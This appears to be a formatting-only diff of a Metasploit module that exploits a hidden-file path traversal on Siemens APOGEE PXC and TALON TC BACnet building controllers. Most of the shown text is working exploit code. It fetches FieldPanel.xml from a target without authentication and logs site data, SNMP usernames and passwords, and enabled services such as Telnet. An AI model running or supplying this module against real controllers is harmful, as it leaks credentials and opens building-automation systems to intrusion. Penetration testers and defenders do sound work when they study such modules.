@@ -18,7 +18,6 @@ try:
 except ImportError:
     dependencies_missing = True
 
-
 # Metasploit Metadata
 metadata = {
     'name': 'Siemens BACnet Field Panel Path Traversal',
@@ -26,7 +25,7 @@ metadata = {
         This module exploits a hidden directory on Siemens APOGEE PXC BACnet Automation Controllers (all versions prior to V3.5), and TALON TC BACnet Automation Controllers (all versions prior to V3.5). With a 7.5 CVSS, this exploit allows for an attacker to perform an authentication bypass using an alternate path or channel to enumerate hidden directories in the web server.
     ''',
     'authors': [
-        'RoseSecurity',    
+        'RoseSecurity',
     ],
     'date': '2022-05-23',
     'license': 'MSF_LICENSE',
@@ -47,14 +46,14 @@ def run(args):
         return
 
     try:
-    	# Download Hidden XML File
+        # Download Hidden XML File
         r = requests.get('http://{}/{}'.format(args['rhost'], '/FieldPanel.xml'), verify=False)
-        
-	# Convert to Readable Format
+
+        # Convert to Readable Format
         xml_doc = r.content
         root = ET.fromstring(xml_doc)
-        
-	# Parse XML for Sensitive Data
+
+        # Parse XML for Sensitive Data
         module.log("Remote Site ID: " + root[18].text)
         module.log("Building Level Network Name: " + root[26].text)
         module.log("Site Name: " + root[27].text)
@@ -76,8 +75,8 @@ def run(args):
         module.log("SNMP Username: " + root[148].text)
         module.log("SNMP Private Password: " + root[149].text)
         module.log("SNMP Authorization Password: " + root[150].text)
-        
-    	# Determine Running Services
+
+        # Determine Running Services
         if int(root[48].text) == 1:
             module.log("Telnet Enabled")
         else:
@@ -98,9 +97,6 @@ def run(args):
         return
 
 
-
-
 if __name__ == '__main__':
     module.run(metadata, run)
-
 
